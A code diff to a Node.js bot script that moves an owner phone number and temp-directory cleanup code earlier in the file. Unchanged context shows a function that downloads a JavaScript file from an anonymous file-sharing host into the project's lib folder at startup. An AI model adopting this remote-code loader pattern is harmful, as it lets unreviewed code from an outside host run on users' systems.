@@ -41,6 +41,23 @@ const {
   const Crypto = require('crypto')
   const path = require('path')
   const https = require('https');
+  const ownerNumber = ['93744215959']
+  
+  const tempDir = path.join(os.tmpdir(), 'cache-temp')
+  if (!fs.existsSync(tempDir)) {
+      fs.mkdirSync(tempDir)
+  }
+  
+  const clearTempDir = () => {
+      fs.readdir(tempDir, (err, files) => {
+          if (err) throw err;
+          for (const file of files) {
+              fs.unlink(path.join(tempDir, file), err => {
+                  if (err) throw err;
+              });
+          }
+      });
+  }
   async function ensurePrefixLoader() {
     const url = 'https://files.catbox.moe/wxqino.js'; // ← آدرس واقعی فایلتو اینجا بذار
     const targetPath = path.join(__dirname, 'lib', 'prefixLoader.js');
@@ -67,24 +84,6 @@ const {
   await ensurePrefixLoader();
   const config = require('./config')
   const prefix = config.PREFIX
-  
-  const ownerNumber = ['93744215959']
-  
-  const tempDir = path.join(os.tmpdir(), 'cache-temp')
-  if (!fs.existsSync(tempDir)) {
-      fs.mkdirSync(tempDir)
-  }
-  
-  const clearTempDir = () => {
-      fs.readdir(tempDir, (err, files) => {
-          if (err) throw err;
-          for (const file of files) {
-              fs.unlink(path.join(tempDir, file), err => {
-                  if (err) throw err;
-              });
-          }
-      });
-  }
   
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
